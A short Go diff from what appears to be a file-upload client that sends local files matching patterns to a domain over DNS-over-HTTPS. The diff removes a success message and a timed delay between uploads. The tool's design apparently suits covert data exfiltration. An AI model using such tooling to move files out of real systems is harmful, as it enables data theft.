@@ -12,8 +12,6 @@ import (
     "os"
     "path/filepath"
     "strings"
-    "time"
-
     "client/utils"
 )
 
@@ -31,14 +29,6 @@ func UploadDOH(keyString, domainName, localPath string, includePatterns []string
         err := uploadFunc(filePath, remoteFilePath, key, domainName)
         if err != nil {
             return fmt.Errorf("\n[-] Error uploading file: %s", err)
-        }
-
-        fmt.Printf("\n[*] File '%s' uploaded successfully over DoH.\n", filePath)
-
-        // If scheduling is enabled, wait before the next upload
-        if scheduleInterval > 0 {
-            fmt.Printf("[*] Waiting %d minutes before uploading next file...\n", scheduleInterval)
-            time.Sleep(time.Duration(scheduleInterval) * time.Minute)
         }
 
         return nil
